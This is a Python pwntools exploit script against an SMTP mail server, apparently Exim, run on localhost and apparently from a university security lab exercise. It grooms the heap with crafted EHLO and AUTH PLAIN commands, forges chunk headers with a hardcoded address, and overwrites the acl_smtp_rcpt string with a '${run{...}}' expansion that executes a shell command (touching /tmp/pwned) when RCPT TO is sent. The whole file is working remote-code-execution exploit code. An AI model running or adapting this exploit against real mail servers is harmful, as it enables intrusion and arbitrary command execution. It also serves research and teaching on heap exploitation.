#!/usr/bin/env python3

import time

from pwn import *

from smtp import *


def exploit():
    with remote("localhost", 25) as p:
        time.sleep(1.0)

        # 2000 = 0x7d0
        # 8000 = 0x1f40
        # 8200 = 0x2008

        EHLO(p, "A" * 0x1F40)
        EHLO(p, "B" * 0x10)
        UNKNOWN(p, b"\xff" * 0x7D0)
        EHLO(p, "C" * 0x2008)
        AUTH_PLAIN(p, bad_base64("D" * 0x2008)[:-1] + "PE")
        new_header_offset = (
            0xD0 - 0x10 - 0x10
        )  # extension size (0x20f0-0x2020) - chunk and storeblock headers size (0x10+0x10)
        b2_size = 0x2008  # size of second b64 decoded storeblock
        fake_chunk_header = p64(0)  # prev_size
        fake_chunk_header += p64(0x1F51)  # size
        AUTH_PLAIN(
            p,
            bad_base64(
                b"E" * new_header_offset
                + fake_chunk_header
                + b"F" * (b2_size - new_header_offset - len(fake_chunk_header))
            ),
        )
        EHLO(p, "G" * 16)
        UNKNOWN(p, b"\xff" * 0x7D0)
        UNKNOWN(p, b"\xff" * 0x7D0)
        fake_chunk_header = p64(0x4110)
        fake_chunk_header += p64(0x1F50)
        AUTH_PLAIN(
            p,
            bad_base64(
                b"H" * new_header_offset
                + fake_chunk_header
                + b"I" * (b2_size - new_header_offset - len(fake_chunk_header))
            ),
        )
        # address of the ACL strings storeblock (not the chunk)
        address_of_acl_storeblock = 0x55555562E6C0
        AUTH_PLAIN(
            p,
            bad_base64(
                b"J" * 0x2008  # filler
                + p64(0x2021)  # chunk size
                + p64(address_of_acl_storeblock)
                + p64(0x2008)  # storeblock length (size)
                + b"K" * 184  # filler
            ),
        )
        # this releases the storeblocks (also our ACL storeblock) because of the reset
        EHLO(p, "L" * 16)
        # the offset from ACL string storeblock address + 0x10 until the acl_smtp_rcpt string
        acl_smtp_rcpt_offset = 288
        cmd = b'/bin/bash -c "touch /tmp/pwned"'
        cmd_expansion_string = b"${run{" + cmd + b"}}\0"
        # overwrite the acl_smtp_rcpt string with our custom command
        AUTH_PLAIN(
            p,
            bad_base64(
                b"M" * acl_smtp_rcpt_offset
                + cmd_expansion_string
                + b"N" * (0x2008 - acl_smtp_rcpt_offset - len(cmd_expansion_string))
            ),
        )
        p.sendline(b"MAIL FROM:<fun@pabe.seclab-bonn.de>")
        print(p.recvuntil(b"OK"))
        # this will trigger the ACL check!
        p.sendline(b"RCPT TO:<hack-the-heap@pabe.seclab-bonn.de>")
        # print(p.recvuntil(b"OK"))


if __name__ == "__main__":
    exploit()
